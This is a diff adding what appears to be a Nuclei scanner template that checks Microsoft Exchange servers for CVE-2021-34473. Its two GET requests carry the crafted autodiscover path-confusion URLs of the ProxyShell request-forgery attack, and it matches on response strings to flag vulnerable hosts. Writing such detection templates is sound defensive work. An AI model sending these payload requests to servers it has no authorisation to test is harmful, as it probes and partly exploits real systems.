@@ -1,0 +1,22 @@
+id: microsoft-exchange-server-rce
+info:
+  name: Microsoft Exchange Server Remote Code Execution Vulnerability (CVE-2021-34473)
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: rce,cve,cve-2021-34473,exchange-server
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/autodiscover/autodiscover.json?@test.com/owa/?&Email=autodiscover/autodiscover.json%3F@test.com"
+      - "{{BaseURL}}/autodiscover/autodiscover.json?@test.com/mapi/nspi/?&Email=autodiscover/autodiscover.json%3F@test.com"
+    matchers-condition: or
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "Microsoft.Exchange.Clients.Owa2.Server.Core.OwaADUserNotFoundException"
+      - type: word
+        part: body
+        words:
+          - "Exchange MAPI/HTTP Connectivity Endpoint"
